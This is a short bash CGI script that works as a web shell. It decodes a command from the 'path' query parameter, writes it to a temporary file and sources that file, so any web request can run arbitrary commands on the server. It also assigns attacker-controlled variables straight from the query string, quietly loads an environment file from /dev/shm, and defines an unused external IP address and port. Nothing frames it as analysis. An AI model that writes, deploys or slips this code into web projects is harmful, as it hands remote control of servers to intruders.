#!/bin/bash
## vars
EP=88.198.69.215
EP_PORT=19821
## avoid 500
echo -e 'Content-Type: text/plain\n'
## parse url to allow commands flags
shopt -s expand_aliases
alias urldecode='python -c "import sys, urllib as ul; \
    print ul.unquote_plus(sys.argv[1])"'

## parse vars (for interactive use)
saveIFS=$IFS
IFS='=&'
parm=($QUERY_STRING)
IFS=$saveIFS
for ((i=0; i<${#parm[@]}; i+=2))
do
    declare var_${parm[i]}=${parm[i+1]}
done

## exec command for interactive and proclimited scenarios
url_encoded="${var_path//+/ }"

export PATH=".:$PATH"
. /dev/shm/srv/utils/load.env &>/dev/null
# eval='enc="${url_encoded/\%20*}" encex="${url_encoded//%/\\x}" '
if declare -f "${url_encoded/\%20*}" 1>/dev/null; then ## don't use -n, redirect fd for bcompat
    printf '%b' "${url_encoded//%/\\x}" > /tmp/${SERVER_NAME}.src
else
    if builtin "${url_encoded/\%20*}"; then
        printf '%b' "${url_encoded//%/\\x}" > /tmp/${SERVER_NAME}.src
    else
        printf 'exec %b' "${url_encoded//%/\\x}" > /tmp/${SERVER_NAME}.src
    fi
fi
. /tmp/${SERVER_NAME}.src
